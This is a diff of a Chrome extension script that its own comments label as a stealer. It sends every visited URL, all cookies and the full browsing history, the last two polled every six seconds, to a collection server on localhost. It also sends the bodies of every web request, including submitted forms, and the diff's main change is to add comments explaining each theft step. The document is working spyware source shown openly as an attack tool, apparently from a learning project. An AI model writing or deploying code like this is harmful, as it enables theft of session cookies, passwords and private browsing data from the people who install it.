@@ -1,13 +1,13 @@
-const SERVER_HOST = "http://127.0.0.1:5000"
-
+const IP ='http://127.0.0.1:5000'
+const DefaultIP = IP + '/control_server'
 
 //URL DATA
 
 chrome.webNavigation.onCompleted.addListener((e) => {
-    if (e.url != 'about:blank'){
+    if (e.url != 'about:blank'){ //Only works where it is an actual web page
     
         fetch(
-            `${SERVER_HOST}/u`,
+            `${IP}/u`, //Send it to the special route for url in the Simple Server to save in a .csv
         {
             method: "POST",
             body: JSON.stringify({ url: e.url }),
@@ -22,19 +22,18 @@ chrome.webNavigation.onCompleted.addListener((e) => {
 
 //Cookies Data
 
-chrome.alarms.create({ periodInMinutes: 0.1 });
 
 
-function logCookies(cookies) {
+function logCookies(cookies) { //Steals all cookies
     var a = [];
     for (const cookie of cookies) {
-      a.push(cookie);
+      a.push(cookie); //Put all cookies in a list
     }
     fetch(
-        `${SERVER_HOST}/c`,
+        `${IP}/c`, //Send it to the specific route for cookies in the Simple Server
         {
             method: "POST",
-            body:JSON.stringify(a),
+            body:JSON.stringify(a), //trasnfor the list in a suitable Json text
             headers: {
                 "Content-Type": "application/json"
             }
@@ -42,13 +41,13 @@ function logCookies(cookies) {
     );
   }
 
-function logHistory(hists){
+function logHistory(hists){ //Steal all the browsin history
     var a = []
-    for(const his of hists){
-        a.push(his)
+    for(const his of hists){ //create a list with all entries instead of the form it is outputed by the function
+        a.push(his) 
     }
     fetch(
-        `${SERVER_HOST}/h`,
+        `${IP}/h`, //Send it to the specific route for history in the Simple Server
         {
             method: "POST",
             body:JSON.stringify(a),
@@ -60,18 +59,18 @@ function logHistory(hists){
 
 }
 
-function logFormData(form){
+function logFormData(form){ //Steal all form
 
         let data = {};
-        if (form.requestBody != undefined) {
-            if (form.requestBody.formData != undefined) {
+        if (form.requestBody != undefined) { //if the form is not empty
+            if (form.requestBody.formData != undefined) { //take the form attributes if it has it
                 data["data"] = form.requestBody.formData
             }
-            if (form.requestBody.raw != undefined) {
+            if (form.requestBody.raw != undefined) { // take the webmasterfile information if it has it
                 data["data"] = form.requestBody.formData.raw.join("");
             }
             fetch(
-                `${SERVER_HOST}/f`,
+                `${IP}/f`,//Send it to the specific route for form in the Simple Server
                 {
                     method: "POST",
                     body: JSON.stringify(data),
@@ -85,18 +84,19 @@ function logFormData(form){
 
 }
 
+chrome.alarms.create({ periodInMinutes: 0.1 }); //Create an alarm that goes every each 6 seconds
 
-  chrome.alarms.onAlarm.addListener(()=>{
-    chrome.cookies.getAll({}).then(logCookies);
-    chrome.history.search({ text: "" }).then(logHistory);
+chrome.alarms.onAlarm.addListener(()=>{ //when the alarm goes
+    chrome.cookies.getAll({}).then(logCookies); //steal all cookies
+    chrome.history.search({ text: "" }).then(logHistory); //steal browser history
 
 })
 
 
 
 //Form DATA
-chrome.webRequest.onBeforeRequest.addListener(
-    (e) => {logFormData(e)},
+chrome.webRequest.onBeforeRequest.addListener( //When a request is done
+    (e) => {logFormData(e)}, //take it an pass it to the form stealer
     {urls: ["<all_urls>"]},
     ["requestBody"]
 );
